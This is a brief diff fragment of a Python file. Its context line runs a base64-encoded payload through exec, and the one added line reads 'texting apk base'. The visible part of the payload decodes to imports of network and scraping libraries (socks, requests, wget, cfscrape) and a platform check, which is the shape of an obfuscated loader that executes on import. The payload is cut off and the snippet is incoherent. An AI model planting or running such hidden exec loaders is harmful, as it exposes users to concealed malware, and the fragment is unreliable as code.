@@ -1,2 +1,3 @@
 import base64
 exec(base64.b64decode('aW1wb3J0IG9zLCBzeXMsIGNvZGVjcwoKdHJ5OgogICAgaW1wb3J0IHNvY2tzLCByZXF1ZXN0cywgd2dldCwgY2ZzY3JhcGUsIHVybGxpYjMKZXhjZXB0OgogICAgaWYgc3lzLnBsYXRmb3J$
+texting apk base
